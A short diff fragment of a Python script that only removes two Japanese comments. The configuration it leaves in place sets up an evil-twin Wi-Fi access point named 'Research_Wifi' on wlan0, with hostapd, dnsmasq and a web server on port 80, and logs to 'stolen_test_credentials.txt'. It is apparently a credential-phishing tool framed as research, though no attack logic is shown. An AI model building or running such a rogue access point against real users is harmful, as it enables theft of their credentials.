@@ -16,14 +16,12 @@ import subprocess
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 
-# 設定
 INTERFACE = "wlan0"
 EVIL_TWIN_SSID = "Research_Wifi"
 CHANNEL = "6"
 LOG_FILE = "stolen_test_credentials.txt"
 PORT = 80
 
-# グローバル変数
 HOSTAPD_PID = None
 DNSMASQ_PID = None
 HTTPD = None
